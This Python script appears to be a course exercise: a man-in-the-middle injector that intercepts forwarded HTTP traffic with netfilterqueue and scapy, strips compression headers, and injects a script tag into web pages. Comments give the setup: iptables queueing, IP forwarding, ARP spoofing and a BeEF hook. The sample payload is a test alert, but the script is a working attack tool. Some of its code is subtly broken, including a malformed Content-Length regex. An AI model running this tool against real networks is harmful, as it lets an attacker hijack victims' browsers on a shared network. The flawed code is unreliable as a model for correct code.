#!/usr/bin/env python3

import netfilterqueue  # used because we can't modify packets using scapy
import scapy.all as scapy
import  re
def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

# 1. flush ip table
# 2. insert beef hook code 
# 3. iptables -I FORWARD -j NFQUEU --queue-num 0
# 4. echo 1 > /proc/sys/net/ipv4/ip_forward 
# 5. Run arp-spoofer
# 6. open http page in victim machine
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80: #8080 -> if using bettercap proxy
            print("[+] Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            load = load.replace("HTTP/1.1", "HTTP/1.0")  # to avoid chunked transfer encoding

        elif scapy_packet[scapy.TCP].sport == 80: # 8080 -> if using bettercap proxy
            print("[+] Response")
            # print(scapy_packet.show())
            injection_code = "<script>alert('test');</script>"
            # We can replace anything replace links, images and that to of any field of the web page
            load = load.replace("</body>", injection_code + "</body>")
            content_length_search = re.search("?:(Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load: 
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))
            
        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()  # to forward the packets from victim to the destination

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()